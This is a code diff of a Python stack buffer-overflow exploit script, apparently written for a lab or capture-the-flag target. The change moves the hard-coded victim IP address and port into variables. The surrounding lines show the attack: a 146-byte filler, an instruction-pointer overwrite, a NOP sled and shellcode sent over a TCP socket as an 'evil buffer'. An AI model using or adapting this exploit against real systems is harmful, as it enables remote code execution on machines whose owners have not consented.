@@ -9,6 +9,10 @@ and change the victim IP address.
 
 import socket
 
+# change this
+victim_ip = "10.10.47.35"
+victim_port = 31337
+
 print("\nSending evil buffer...")
 
 filler = b"\x41" * 146
@@ -53,8 +57,7 @@ buffer = filler + eip + nops + shellcode + b"\x0a"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# change the victim ip as necessary
-s.connect(("10.10.47.35", 31337))
+s.connect((victim_ip, victim_port))
 s.send(buffer)
 
 s.close()
